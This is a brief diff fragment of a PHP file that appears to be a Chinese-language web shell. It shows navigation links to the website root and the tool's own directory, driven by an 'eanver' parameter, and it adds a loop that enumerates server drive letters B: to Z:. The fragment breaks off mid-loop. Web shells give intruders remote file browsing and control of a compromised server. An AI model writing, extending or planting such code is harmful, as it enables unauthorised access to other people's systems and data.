@@ -77,3 +77,4 @@ switch($eanver){
     $ROOT_DIR = File_Mode();
     html_n("<li><a title='$ROOT_DIR' href='?eanver=main&path=$ROOT_DIR' target='main'>网站根目录</a></li>");
 	html_n("<li><a href='?eanver=main' target='main'>本程序目录</a></li>");
+	for ($i=66;$i<=90;$i++){$drive= chr($i).':';
